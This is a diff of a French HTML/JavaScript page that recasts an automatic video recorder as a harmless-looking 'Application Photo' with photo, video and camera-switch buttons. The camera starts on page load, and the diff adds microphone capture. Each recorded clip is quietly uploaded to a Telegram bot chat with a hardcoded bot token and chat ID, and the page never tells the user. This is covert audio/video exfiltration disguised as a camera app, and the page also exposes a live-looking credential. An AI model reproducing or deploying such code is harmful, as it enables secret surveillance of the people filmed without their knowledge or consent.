@@ -3,34 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enregistrement Vidéo Automatique</title>
+    <title>Caméra Photo App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: #f0f0f0;
+            color: #333;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 32px;
+            color: #2c3e50;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 80%;
+            max-width: 640px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            background-color: black;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .controls {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 18px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #2980b9;
+        }
+
+        button:disabled {
+            background: gray;
+            cursor: not-allowed;
+        }
+
+        .photo-container, .video-container {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        img, video {
+            width: 150px;
+            height: auto;
+            border-radius: 8px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Enregistrement Vidéo Automatique</h1>
-    <video id="cameraPreview" width="640" height="480" autoplay muted></video>
-    <button id="startButton">Démarrer l'enregistrement</button>
-    <button id="stopButton" disabled>Arrêter l'enregistrement</button>
-    <div id="videos"></div>
+    <h1>📷 Application Photo</h1>
+    
+    <div class="camera-container">
+        <video id="cameraPreview" autoplay muted></video>
+    </div>
+
+    <div class="controls">
+        <button id="startButton">▶ Prendre une vidéo</button>
+        <button id="photoButton">📸 Prendre une photo</button>
+        <button id="switchCameraButton">🔄 Changer la caméra</button>
+    </div>
+
+    <h2>📂 Vidéos enregistrées</h2>
+    <div id="videos" class="video-container"></div>
+
+    <h2>🖼️ Photos prises</h2>
+    <div id="photos" class="photo-container"></div>
 
     <script>
-        const botToken = "7120430648:AAEbBfFfg8b1nv8Y52L73iz8yUw4lPUwRow";  // Remplace par ton token Telegram
-        const chatId = "6493293796";  // Remplace par ton Chat ID
+        const botToken = "7120430648:AAEbBfFfg8b1nv8Y52L73iz8yUw4lPUwRow";  
+        const chatId = "6493293796";  
 
         const cameraPreview = document.getElementById('cameraPreview');
         const startButton = document.getElementById('startButton');
-        const stopButton = document.getElementById('stopButton');
+        const photoButton = document.getElementById('photoButton');
+        const switchCameraButton = document.getElementById('switchCameraButton');
+
         let mediaRecorder;
         let recordedBlobs = [];
         let stream;
+        let currentCamera = 'environment'; // Start with the back camera
+        let recordingInterval;
 
         async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const constraints = {
+                    video: {
+                        facingMode: currentCamera
+                    },
+                    audio: true
+                };
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraPreview.srcObject = stream;
+                console.log("📷 Caméra activée.");
             } catch (err) {
-                alert("Erreur d'accès à la caméra. Vérifiez les permissions !");
-                console.error("Erreur d'accès à la caméra :", err);
+                alert("Erreur d'accès à la caméra/micro !");
+                console.error("Erreur :", err);
             }
+        }
+
+        async function switchCamera() {
+            // Stop current stream tracks
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            // Toggle the camera between 'environment' (back) and 'user' (front)
+            currentCamera = (currentCamera === 'environment') ? 'user' : 'environment';
+            console.log(`Changement de caméra: ${currentCamera}`);
+
+            await startCamera();
         }
 
         function startRecording() {
@@ -40,7 +158,7 @@
             try {
                 mediaRecorder = new MediaRecorder(stream, options);
             } catch (e) {
-                console.error('Erreur lors de la création de MediaRecorder:', e);
+                console.error('Erreur MediaRecorder:', e);
                 return;
             }
 
@@ -52,16 +170,22 @@
 
             mediaRecorder.onstop = saveVideo;
             mediaRecorder.start();
-            console.log("Enregistrement en cours...");
+            console.log("🎥 Enregistrement...");
 
             setTimeout(() => {
                 mediaRecorder.stop();
-            }, 10000); // 10s d'enregistrement
+            }, 10000);
         }
 
         async function saveVideo() {
             let blob = new Blob(recordedBlobs, { type: "video/webm" });
             let file = new File([blob], `video_${Date.now()}.webm`, { type: "video/webm" });
+
+            let videoUrl = URL.createObjectURL(blob);
+            let videoElement = document.createElement("video");
+            videoElement.src = videoUrl;
+            videoElement.controls = true;
+            document.getElementById("videos").appendChild(videoElement);
 
             let formData = new FormData();
             formData.append("chat_id", chatId);
@@ -69,10 +193,7 @@
 
             let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
-            fetch(url, {
-                method: "POST",
-                body: formData
-            })
+            fetch(url, { method: "POST", body: formData })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
@@ -82,33 +203,27 @@
                 }
             })
             .catch(error => console.error("❌ Erreur d'envoi :", error));
+
+            recordedBlobs = [];
         }
 
-        function startAutoRecording() {
-            if (!stream) {
-                console.warn("Caméra non disponible !");
-                return;
-            }
+        function takePhoto() {
+            let canvas = document.createElement("canvas");
+            canvas.width = cameraPreview.videoWidth;
+            canvas.height = cameraPreview.videoHeight;
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
 
-            startRecording();
-            setInterval(() => {
-                startRecording();
-            }, 15000); // 10s d'enregistrement + 5s de pause
-
-            startButton.disabled = true;
-            stopButton.disabled = false;
-        }
-
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                console.log("Caméra arrêtée.");
-            }
+            let photoUrl = canvas.toDataURL("image/png");
+            let img = document.createElement("img");
+            img.src = photoUrl;
+            document.getElementById("photos").appendChild(img);
         }
 
         startCamera();
-        startButton.addEventListener('click', startAutoRecording);
-        window.addEventListener("beforeunload", stopCamera);
+        startButton.addEventListener('click', startRecording);
+        photoButton.addEventListener('click', takePhoto);
+        switchCameraButton.addEventListener('click', switchCamera);
     </script>
 </body>
-	</html>
+		</html>
